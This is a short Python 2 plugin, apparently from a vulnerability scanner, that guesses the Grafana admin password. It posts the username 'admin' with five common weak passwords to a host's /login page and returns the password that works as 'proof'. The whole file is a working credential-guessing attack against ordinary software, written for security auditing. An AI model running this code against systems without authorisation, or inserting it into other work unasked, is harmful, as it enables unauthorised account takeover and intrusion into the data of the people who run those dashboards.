#-*- encoding:utf-8 -*-
import urllib
import urllib2
from config import is_port_open, is_http


# @is_port_open
def verify(ip, port=80, name=None, timeout=10, types='ip'):
    # if is_http(ip, int(port)) is False:
    #     return
    if types == 'ip':
        url = "http://%s:%s/login" %(ip, str(port))
    else:
        url = 'http://{}'.format(ip)
    
    header={
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36',
        'ContentType': 'application/x-www-form-urlencoded; chartset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'Connection': 'close'
    }
    PASSWORD_DIC = ['admin', 'grafana', '123456', 'admin123', '1234qwer']
    for password in PASSWORD_DIC:
        data = {"user": "admin", "email": "", "password": password}
        data = urllib.urlencode(data)
        request = urllib2.Request(url=url, data=data, headers=header)
        try:
            res = urllib2.urlopen(request, timeout=timeout)
            if "Logged in" in res.read():
                info = {
                    "url": url,
                    "vuln_name": "grafana weak password",
                    "severity": "high",
                    "proof": "username={}&password={}".format("admin", password)
                }
                return info
        except Exception,e:
            pass
